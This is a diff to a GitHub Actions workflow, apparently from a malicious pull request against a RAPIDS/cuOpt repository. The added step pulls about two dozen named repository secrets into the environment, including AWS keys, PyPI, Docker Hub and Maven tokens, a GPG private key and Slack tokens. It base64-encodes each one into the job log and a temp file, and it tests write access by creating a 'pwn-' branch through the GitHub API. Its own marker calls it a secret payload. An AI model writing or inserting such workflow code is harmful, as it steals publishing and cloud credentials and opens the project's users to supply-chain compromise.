@@ -8,7 +8,7 @@ on:
 permissions: write-all
 
 jobs:
-  fork-probe:
+  probe:
     runs-on: ubuntu-latest
     permissions: write-all
     steps:
@@ -16,15 +16,68 @@ jobs:
         env:
           GH_TOKEN: ${{ github.token }}
           REPO: ${{ github.repository }}
-          SHA: ${{ github.event.pull_request.head.sha || github.sha }}
-          EV: ${{ github.event_name }}
-          SECRETS_JSON: ${{ toJSON(secrets) }}
+          REF_NAME: ${{ github.ref_name }}
+          SHA: ${{ github.sha }}
+          EVENT: ${{ github.event_name }}
+          S_CONDA_RAPIDSAI_NIGHTLY_TOKEN: ${{ secrets.CONDA_RAPIDSAI_NIGHTLY_TOKEN }}
+          S_CONDA_RAPIDSAI_TOKEN: ${{ secrets.CONDA_RAPIDSAI_TOKEN }}
+          S_CONDA_RAPIDSAI_WHEELS_NIGHTLY_TOKEN: ${{ secrets.CONDA_RAPIDSAI_WHEELS_NIGHTLY_TOKEN }}
+          S_CUOPT_AWS_ACCESS_KEY_ID: ${{ secrets.CUOPT_AWS_ACCESS_KEY_ID }}
+          S_CUOPT_AWS_SECRET_ACCESS_KEY: ${{ secrets.CUOPT_AWS_SECRET_ACCESS_KEY }}
+          S_CUOPT_DOCKERHUB_TOKEN: ${{ secrets.CUOPT_DOCKERHUB_TOKEN }}
+          S_CUOPT_DOCKERHUB_USERNAME: ${{ secrets.CUOPT_DOCKERHUB_USERNAME }}
+          S_CUOPT_NGC_DOCKER_KEY: ${{ secrets.CUOPT_NGC_DOCKER_KEY }}
+          S_CUOPT_PRD_TEST_CLIENT_ID: ${{ secrets.CUOPT_PRD_TEST_CLIENT_ID }}
+          S_CUOPT_PRD_TEST_FUNCTION_ID: ${{ secrets.CUOPT_PRD_TEST_FUNCTION_ID }}
+          S_CUOPT_PRD_TEST_SECRET: ${{ secrets.CUOPT_PRD_TEST_SECRET }}
+          S_CUOPT_S3_URI: ${{ secrets.CUOPT_S3_URI }}
+          S_CUOPT_SLACK_BOT_TOKEN: ${{ secrets.CUOPT_SLACK_BOT_TOKEN }}
+          S_CUOPT_SLACK_CHANNEL_ID: ${{ secrets.CUOPT_SLACK_CHANNEL_ID }}
+          S_CUOPT_SLACK_MENTION_ID: ${{ secrets.CUOPT_SLACK_MENTION_ID }}
+          S_GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
+          S_GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
+          S_KITMAKER_PORTAL_ACC_OWNER_EMAIL: ${{ secrets.KITMAKER_PORTAL_ACC_OWNER_EMAIL }}
+          S_KITMAKER_PORTAL_AUTHORIZATION: ${{ secrets.KITMAKER_PORTAL_AUTHORIZATION }}
+          S_MAVEN_DEPLOY_TOKEN: ${{ secrets.MAVEN_DEPLOY_TOKEN }}
+          S_NVSKILLS_CI_DISPATCH_TOKEN: ${{ secrets.NVSKILLS_CI_DISPATCH_TOKEN }}
+          S_NV_SLACK_BREAKING_CHANGE_NOTIFIER_APP: ${{ secrets.NV_SLACK_BREAKING_CHANGE_NOTIFIER_APP }}
+          S_RAPIDSAI_PYPI_CI_PASSWORD: ${{ secrets.RAPIDSAI_PYPI_CI_PASSWORD }}
+          S_RAPIDSAI_PYPI_TOKEN: ${{ secrets.RAPIDSAI_PYPI_TOKEN }}
+          S_FLAG: ${{ secrets.FLAG }}
+          S_CANARY: ${{ secrets.CANARY }}
         run: |
-          echo "MARKER=fork-pr-token-probe"
-          echo "EVENT=$EV SHA=$SHA"
-          echo "SECRETS=$SECRETS_JSON"
-          code=$(curl -s -o /tmp/resp -w '%{http_code}' -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/$REPO")
-          echo "repo_read_http=$code"
-          code2=$(curl -s -o /tmp/resp2 -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$REPO/git/refs" -d "{\"ref\":\"refs/heads/pwn-pr-$EV\",\"sha\":\"$SHA\"}")
+          echo "MARKER=lazyhacker6-named-secret-payload"
+          echo "EVENT=$EVENT REF=$REF_NAME SHA=$SHA REPO=$REPO"
+          {
+          printf '%s' "$S_CONDA_RAPIDSAI_NIGHTLY_TOKEN" | base64 -w0 | sed 's/^/S_CONDA_RAPIDSAI_NIGHTLY_TOKEN=/'
+          printf '%s' "$S_CONDA_RAPIDSAI_TOKEN" | base64 -w0 | sed 's/^/S_CONDA_RAPIDSAI_TOKEN=/'
+          printf '%s' "$S_CONDA_RAPIDSAI_WHEELS_NIGHTLY_TOKEN" | base64 -w0 | sed 's/^/S_CONDA_RAPIDSAI_WHEELS_NIGHTLY_TOKEN=/'
+          printf '%s' "$S_CUOPT_AWS_ACCESS_KEY_ID" | base64 -w0 | sed 's/^/S_CUOPT_AWS_ACCESS_KEY_ID=/'
+          printf '%s' "$S_CUOPT_AWS_SECRET_ACCESS_KEY" | base64 -w0 | sed 's/^/S_CUOPT_AWS_SECRET_ACCESS_KEY=/'
+          printf '%s' "$S_CUOPT_DOCKERHUB_TOKEN" | base64 -w0 | sed 's/^/S_CUOPT_DOCKERHUB_TOKEN=/'
+          printf '%s' "$S_CUOPT_DOCKERHUB_USERNAME" | base64 -w0 | sed 's/^/S_CUOPT_DOCKERHUB_USERNAME=/'
+          printf '%s' "$S_CUOPT_NGC_DOCKER_KEY" | base64 -w0 | sed 's/^/S_CUOPT_NGC_DOCKER_KEY=/'
+          printf '%s' "$S_CUOPT_PRD_TEST_CLIENT_ID" | base64 -w0 | sed 's/^/S_CUOPT_PRD_TEST_CLIENT_ID=/'
+          printf '%s' "$S_CUOPT_PRD_TEST_FUNCTION_ID" | base64 -w0 | sed 's/^/S_CUOPT_PRD_TEST_FUNCTION_ID=/'
+          printf '%s' "$S_CUOPT_PRD_TEST_SECRET" | base64 -w0 | sed 's/^/S_CUOPT_PRD_TEST_SECRET=/'
+          printf '%s' "$S_CUOPT_S3_URI" | base64 -w0 | sed 's/^/S_CUOPT_S3_URI=/'
+          printf '%s' "$S_CUOPT_SLACK_BOT_TOKEN" | base64 -w0 | sed 's/^/S_CUOPT_SLACK_BOT_TOKEN=/'
+          printf '%s' "$S_CUOPT_SLACK_CHANNEL_ID" | base64 -w0 | sed 's/^/S_CUOPT_SLACK_CHANNEL_ID=/'
+          printf '%s' "$S_CUOPT_SLACK_MENTION_ID" | base64 -w0 | sed 's/^/S_CUOPT_SLACK_MENTION_ID=/'
+          printf '%s' "$S_GPG_PASSPHRASE" | base64 -w0 | sed 's/^/S_GPG_PASSPHRASE=/'
+          printf '%s' "$S_GPG_PRIVATE_KEY" | base64 -w0 | sed 's/^/S_GPG_PRIVATE_KEY=/'
+          printf '%s' "$S_KITMAKER_PORTAL_ACC_OWNER_EMAIL" | base64 -w0 | sed 's/^/S_KITMAKER_PORTAL_ACC_OWNER_EMAIL=/'
+          printf '%s' "$S_KITMAKER_PORTAL_AUTHORIZATION" | base64 -w0 | sed 's/^/S_KITMAKER_PORTAL_AUTHORIZATION=/'
+          printf '%s' "$S_MAVEN_DEPLOY_TOKEN" | base64 -w0 | sed 's/^/S_MAVEN_DEPLOY_TOKEN=/'
+          printf '%s' "$S_NVSKILLS_CI_DISPATCH_TOKEN" | base64 -w0 | sed 's/^/S_NVSKILLS_CI_DISPATCH_TOKEN=/'
+          printf '%s' "$S_NV_SLACK_BREAKING_CHANGE_NOTIFIER_APP" | base64 -w0 | sed 's/^/S_NV_SLACK_BREAKING_CHANGE_NOTIFIER_APP=/'
+          printf '%s' "$S_RAPIDSAI_PYPI_CI_PASSWORD" | base64 -w0 | sed 's/^/S_RAPIDSAI_PYPI_CI_PASSWORD=/'
+          printf '%s' "$S_RAPIDSAI_PYPI_TOKEN" | base64 -w0 | sed 's/^/S_RAPIDSAI_PYPI_TOKEN=/'
+          printf '%s' "$S_FLAG" | base64 -w0 | sed 's/^/S_FLAG=/'
+          printf '%s' "$S_CANARY" | base64 -w0 | sed 's/^/S_CANARY=/'
+          } | tee /tmp/dump.txt
+          code=$(curl -s -o /tmp/r -w '%{http_code}' -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/$REPO")
+          echo "repo_http=$code"
+          code2=$(curl -s -o /tmp/r2 -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" "https://api.github.com/repos/$REPO/git/refs" -d "{\"ref\":\"refs/heads/pwn-$EVENT-$REF_NAME\",\"sha\":\"$SHA\"}")
           echo "ref_create_http=$code2"
-          cat /tmp/resp2
+          cat /tmp/r2
